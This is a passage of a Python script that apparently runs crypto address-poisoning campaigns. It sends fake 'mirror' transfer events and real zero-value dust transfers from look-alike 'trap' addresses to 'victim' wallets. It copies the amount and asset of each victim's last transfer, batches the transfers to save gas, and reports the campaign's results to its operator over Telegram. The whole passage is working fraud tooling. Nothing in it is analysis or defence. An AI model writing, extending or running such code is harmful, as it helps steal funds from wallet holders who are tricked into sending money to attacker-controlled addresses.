                                logger.error(f"⛽ Stopping batch: {gas_failures} consecutive gas failures")
                                poison_queue.clear()
                                break
                        else:
                            logger.error(f"[batch] ❌ Multi-token batch failed (other reason)")
                    except Exception:
                        logger.error(f"[batch] ❌ Multi-token batch failed")
                else:
                    logger.error(f"[batch] ❌ Multi-token batch failed (no operator key)")
            
            poison_queue.clear()
            
            if REAL_DUST_ENABLED and real_queue:
                logger.info(f"[real-zero] Fake batch done. Waiting 60 seconds before real zero-dust ({len(real_queue)} items)...")
                time.sleep(60)
                real_batch_success, _ = flush_real_zero_queue(real_queue, campaign_id, is_final=False)
                real_success += real_batch_success
                real_queue.clear()
                time.sleep(2)
        
        if job_id and i % 5 == 0:
            update_job(job_id, progress=i)
        time.sleep(0.5)  # Reduced delay since we're batching
    
        # 🚀 Process remaining items in queue (final multi-token batch)
    if poison_queue:
        logger.info(f"[batch] Processing final multi-token batch of {len(poison_queue)} victims...")
        
        batch_trap_ids = [q['trap_id'] for q in poison_queue if q['trap_id']]
        
        tx_hash = emit_multi_token_batch_transfers(poison_queue, campaign_id)
        
        if tx_hash:
            success += len(poison_queue)
            logger.info(f"[batch] ✅ Final multi-token batch emitted: {len(poison_queue)} transfers in tx={tx_hash}")
            
            for tid in batch_trap_ids:
                update_trap_dust_count(tid)
                
            send_batch_telegram_notifications(poison_queue, tx_hash, campaign_id, is_final=True)
        else:
            logger.error(f"[batch] ❌ Final multi-token batch failed")

    if REAL_DUST_ENABLED and real_queue:
        logger.info(f"[real-zero] Fake emit finished. Waiting 60 seconds before final real zero-dust ({len(real_queue)} items)...")
        time.sleep(60)
        real_batch_success, _ = flush_real_zero_queue(real_queue, campaign_id, is_final=True)
        real_success += real_batch_success
        real_queue.clear()

    if REAL_DUST_ENABLED:
        logger.info(f"[real-zero] Real zero-dust completed for this run: {real_success}")
        
       # Summary with gas failure information
    failed = fake_attempted - success
    real_failed = real_attempted - real_success if REAL_DUST_ENABLED else 0
    logger.info(
        f"Completed: fake {success}/{fake_attempted}, real {real_success}/{real_attempted}. "
        f"Skipped (already dusted): {skipped_dusted}. Failed: {failed} (Gas failures: {gas_failures})"
    )

    send_skipped_dusted_notifications(skipped_details, campaign_id)

    if gas_failures > 0:
        summary_msg = (
            f"⚠️ Mirror batch incomplete\n"
            f"🪞 Fake successful: {success}/{fake_attempted}\n"
            f"💧 Real zero-dust: {real_success}/{real_attempted}\n"
            f"⏭️ Skipped (already dusted): {skipped_dusted}\n"
            f"❌ Failed: {failed}\n"
            f"⛽ Gas failures: {gas_failures}\n\n"
            f"💡 Your funding wallet needs more ETH to continue."
        )
    else:
        summary_msg = (
            f"🏁 Batch complete\n"
            f"🪞 Fake: {success}/{fake_attempted} successful\n"
            f"⏭️ Skipped (already dusted): {skipped_dusted}"
        )
        if REAL_DUST_ENABLED:
            summary_msg += f"\n💧 Real zero-dust: {real_success}/{real_attempted} successful"

    send_telegram(summary_msg, campaign_id=campaign_id)

    if job_id:
        all_ok = (success == fake_attempted) and (real_success == real_attempted)
        if all_ok:
            update_job(job_id, status='completed', progress=total, message='All done')
        else:
            update_job(job_id, status='failed', progress=success, message=f'fake {success}/{fake_attempted}, real {real_success}/{real_attempted} ({gas_failures} gas failures)')

if __name__ == "__main__":
    setup_graceful_shutdown()

    parser = argparse.ArgumentParser()
    parser.add_argument('--job-id', help='Job ID for tracking')
    parser.add_argument('private_key', nargs='?', help='Private key for single dust send')
    parser.add_argument('victim_address', nargs='?', help='Victim address for single dust send')
    args = parser.parse_args()
    
    job_id = args.job_id
    campaign_id = None
    trap_ids = None
    
    # 🆕 Read TRAP_IDS from environment (comma-separated UUIDs)
    trap_ids_env = os.getenv('TRAP_IDS', '').strip()
    if trap_ids_env:
        trap_ids = [tid.strip() for tid in trap_ids_env.split(',') if tid.strip()]
        logger.info(f"[main] Received {len(trap_ids)} trap IDs via TRAP_IDS env var")
    
    if job_id:
        update_job(job_id, status='running')
        campaign_id = get_campaign_id_from_job(job_id)
    else:
        campaign_id = os.getenv('CAMPAIGN_ID')

    if args.private_key and args.victim_address:
        trap_address = w3.eth.account.from_key(args.private_key).address.lower()

        # STEP 1: Fetch last transfer from blockchain
        counterparty = get_counterparty_from_db(args.victim_address, campaign_id)
        if not counterparty:
            error_msg = f"❌ Mirror failed: No counterparty found for {args.victim_address}"
            logger.error(error_msg)
            send_telegram(error_msg, campaign_id=campaign_id)
            if job_id:
                update_job(job_id, status='failed', message='No counterparty found')
            sys.exit(1)

        logger.info(f"[mirror] Fetching last transfer from {args.victim_address} to {counterparty}...")
        fetched_asset, fetched_amount = fetch_last_transfer_from_blockchain(args.victim_address, counterparty)

        if not fetched_asset or not fetched_amount:
            # 🆕 Use default fallback: emit a small native transfer
            logger.info(f"[mirror] No transfer found, using default {NATIVE_SYMBOL} fallback (1 {NATIVE_SYMBOL})")
            fetched_asset = NATIVE_SYMBOL
            fetched_amount = w3.to_wei(1, 'ether')

        logger.info(f"[mirror] Last transfer: {fetched_amount} units of {fetched_asset}")

        # STEP 2: Emit FAKE mirror event (no real tokens needed)
        tx_hash = emit_mirror_transfer(args.victim_address, trap_address, fetched_amount, fetched_asset, campaign_id)

        if tx_hash:
            decimals = get_token_decimals(fetched_asset)
            amount_display = fetched_amount / (10 ** decimals)
            
            victim_url = get_explorer_url(args.victim_address)
            trap_url = get_explorer_url(trap_address)
            tx_url = get_explorer_url(tx_hash, 'tx')
            
            success_msg = (
                f"🪞 *Mirror event emitted!*\n\n"
                f"💰 Amount: {amount_display:.6f} {fetched_asset}\n"
                f"👤 [Victim]({victim_url})\n"
                f"🪤 [Trap]({trap_url})\n\n"
                f"🔗 [View TX on Explorer]({tx_url})"
            )
            logger.info(success_msg)
            send_telegram(success_msg, campaign_id=campaign_id)

            # 🆕 REAL ZERO-DUST: fire 60s after the fake emit (single mode)
            if REAL_DUST_ENABLED:
                logger.info("[real-zero] Fake emit done. Waiting 60 seconds before real zero-dust...")
                time.sleep(60)

                real_asset = choose_real_dust_asset(fetched_asset)
                real_tx_hash, _, real_ok = emit_real_zero_transfer(
                    args.victim_address,
                    trap_address,
                    real_asset,
                    campaign_id,
                )

                if real_ok and real_tx_hash:
                    real_msg = (
                        f"💧 *Real Zero-Dust Emitted!*\n\n"
                        f"🪙 Asset: {real_asset} (value: 0)\n"
                        f"👤 [Victim]({get_explorer_url(args.victim_address)})\n"
                        f"🪤 [Trap]({get_explorer_url(trap_address)})\n\n"
                        f"🔗 [View TX on Explorer]({get_explorer_url(real_tx_hash, 'tx')})"
                    )
                    logger.info(real_msg)
                    send_telegram(real_msg, campaign_id=campaign_id)
                else:
                    fail_msg = f"❌ Real zero-dust failed for {args.victim_address} ({real_asset})"
                    logger.error(fail_msg)
                    send_telegram(fail_msg, campaign_id=campaign_id)

            if job_id:
                update_job(job_id, status='completed', progress=1, message='Mirror emitted')
        else:
            error_msg = f"❌ Mirror emission failed for {args.victim_address}"
            logger.error(error_msg)
            send_telegram(error_msg, campaign_id=campaign_id)
            if job_id:
                update_job(job_id, status='failed', message='Mirror emission failed')
            sys.exit(1)
    else:
        batch_poison(job_id=job_id, campaign_id=campaign_id, trap_ids=trap_ids)